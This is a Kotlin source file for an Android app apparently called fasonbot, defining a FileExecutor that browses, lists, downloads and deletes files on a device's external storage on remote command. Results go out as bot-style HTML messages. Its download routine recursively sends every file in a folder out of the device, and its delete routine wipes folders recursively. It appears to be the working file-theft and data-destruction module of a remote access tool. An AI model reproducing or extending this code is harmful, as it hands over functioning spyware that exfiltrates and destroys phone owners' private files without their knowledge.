package com.fasonbot.app.action

import android.content.Context
import android.os.Environment
import android.util.Log
import com.fasonbot.app.util.PermissionHelper
import java.io.File

class FileExecutor(context: Context) : BaseExecutor(context) {

    companion object {
        private const val TAG = "FileExecutor"
        private const val MAX_FILE_SIZE = 50L * 1024 * 1024
        private const val MAX_ITEMS_DISPLAY = 20
        private const val DOWNLOAD_DELAY = 100L
    }

    fun getFileList(path: String): List<FileItem> {
        if (!PermissionHelper.hasReadStorage(context)) return emptyList()
        try {
            val basePath = Environment.getExternalStorageDirectory().path
            val fullPath = if (path.isEmpty() || path == "/") basePath else "$basePath/$path"
            val file = File(fullPath)
            Log.d(TAG, "getFileList: path=$path, fullPath=$fullPath, exists=${file.exists()}, isDir=${file.isDirectory}")
            if (!file.exists() || !file.isDirectory) return emptyList()
            val items = mutableListOf<FileItem>()
            if (file.path != basePath) {
                val parentPath = file.parent?.removePrefix(basePath)?.removePrefix("/") ?: ""
                items.add(FileItem("..", parentPath, isDirectory = true, isParent = true))
            }
            val listFiles = file.listFiles()
            if (!listFiles.isNullOrEmpty()) {
                val sorted = listFiles.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() }))
                sorted.take(MAX_ITEMS_DISPLAY).forEach { item ->
                    val relativePath = item.path.removePrefix(basePath).removePrefix("/")
                    items.add(FileItem(
                        name = item.name,
                        path = relativePath,
                        isDirectory = item.isDirectory,
                        size = if (item.isFile) item.length() else 0
                    ))
                }
                if (sorted.size > MAX_ITEMS_DISPLAY) {
                    items.add(FileItem("... +${sorted.size - MAX_ITEMS_DISPLAY} more", "", isDirectory = false))
                }
            }
            return items
        } catch (e: Exception) {
            Log.e(TAG, "getFileList error: ${e.message}")
            return emptyList()
        }
    }

    fun getDisplayPath(path: String): String =
        if (path.isEmpty() || path == "/") "/" else "/$path"

    fun isValidPath(path: String): Boolean {
        val basePath = Environment.getExternalStorageDirectory().path
        val file = File(if (path.isEmpty() || path == "/") basePath else "$basePath/$path")
        return file.exists() && file.isDirectory
    }

    fun executeDownload(path: String) {
        if (!PermissionHelper.hasReadStorage(context)) {
            sendResponse("❌ <b>Permission Denied</b>\n\nStorage access not granted.", parseMode = "HTML")
            return
        }
        try {
            val basePath = Environment.getExternalStorageDirectory().path
            val file = File("$basePath/$path")
            if (!file.exists()) {
                sendResponse("❌ <b>Not Found</b>\n\n📁 <code>/$path</code>", parseMode = "HTML")
                return
            }
            if (file.isDirectory) {
                val filesCount = countFilesRecursive(file)
                sendResponse(
                    "📥 <b>Downloading Folder</b>\n\n📁 <code>/${file.name}</code>\n📊 $filesCount files\n\n<i>Please wait...</i>",
                    parseMode = "HTML"
                )
                downloadFolderRecursive(file, basePath)
                sendResponse("✅ <b>Download Complete</b>\n\n📁 <code>/${file.name}</code>\n📊 $filesCount files sent", parseMode = "HTML")
            } else if (file.isFile) {
                if (file.length() > MAX_FILE_SIZE) {
                    sendResponse("❌ <b>File Too Large</b>\n\n📊 Size: ${file.length() / 1024 / 1024}MB\n⚠️ Max: 50MB", parseMode = "HTML")
                } else {
                    sendDocument(file)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Download error: ${e.message}")
            sendResponse("❌ <b>Download Failed</b>\n\n${e.message}", parseMode = "HTML")
        }
    }

    private fun countFilesRecursive(folder: File): Int {
        var count = 0
        folder.listFiles()?.forEach { file ->
            if (file.isDirectory) {
                count += countFilesRecursive(file)
            } else {
                count++
            }
        }
        return count
    }

    private fun downloadFolderRecursive(folder: File, basePath: String) {
        folder.listFiles()?.forEach { file ->
            if (file.isDirectory) {
                downloadFolderRecursive(file, basePath)
            } else if (file.isFile && file.length() < MAX_FILE_SIZE) {
                sendDocument(file)
                Thread.sleep(DOWNLOAD_DELAY)
            }
        }
    }

    fun executeDelete(path: String) {
        if (!PermissionHelper.hasWriteStorage(context)) {
            sendResponse("❌ <b>Permission Denied</b>\n\nStorage write access not granted.", parseMode = "HTML")
            return
        }
        try {
            val basePath = Environment.getExternalStorageDirectory().path
            val file = File("$basePath/$path")
            if (!file.exists()) {
                sendResponse("❌ <b>Not Found</b>\n\n📁 <code>/$path</code>", parseMode = "HTML")
                return
            }
            val result = if (file.isDirectory) file.deleteRecursively() else file.delete()
            if (result) {
                sendResponse("✅ <b>Deleted</b>\n\n📁 <code>/${file.name}</code>", parseMode = "HTML")
            } else {
                sendResponse("❌ <b>Delete Failed</b>\n\n📁 <code>/${file.name}</code>", parseMode = "HTML")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Delete error: ${e.message}")
            sendResponse("❌ <b>Delete Failed</b>\n\n${e.message}", parseMode = "HTML")
        }
    }

    fun executeList(path: String) {
        if (!PermissionHelper.hasReadStorage(context)) {
            sendResponse("❌ <b>Permission Denied</b>\n\nStorage access not granted.", parseMode = "HTML")
            return
        }
        try {
            val file = File(Environment.getExternalStorageDirectory().path + "/" + path)
            if (!file.exists()) {
                sendResponse("❌ <b>Not Found</b>\n\n📁 <code>/$path</code>", parseMode = "HTML")
                return
            }
            if (!file.isDirectory) {
                sendResponse("❌ <b>Not a Directory</b>\n\n📁 <code>/$path</code>", parseMode = "HTML")
                return
            }
            val listFiles = file.listFiles()
            if (listFiles.isNullOrEmpty()) {
                sendResponse("📁 <b>Empty Folder</b>\n\n📂 <code>/$path</code>", parseMode = "HTML")
                return
            }
            val content = StringBuilder()
            content.append("📁 <b>Directory Listing</b>\n")
            content.append("━━━━━━━━━━━━━━━━━━━━━━━━\n")
            content.append("📂 <code>/${file.path}</code>\n\n")
            listFiles.sortedBy { it.name }.forEach { item ->
                val icon = if (item.isDirectory) "📁" else "📄"
                val size = if (item.isFile) " (${formatSize(item.length())})" else "/"
                content.append("$icon ${item.name}$size\n")
            }
            content.append("\n📊 ${listFiles.size} items")
            sendResponse(content.toString(), parseMode = "HTML")
        } catch (e: Exception) {
            Log.e(TAG, "List error: ${e.message}")
            sendResponse("❌ <b>Error</b>\n\n${e.message}", parseMode = "HTML")
        }
    }

    private fun formatSize(bytes: Long): String = when {
        bytes < 1024 -> "$bytes B"
        bytes < 1024 * 1024 -> "${bytes / 1024} KB"
        bytes < 1024 * 1024 * 1024 -> "${bytes / 1024 / 1024} MB"
        else -> "${bytes / 1024 / 1024 / 1024} GB"
    }
}
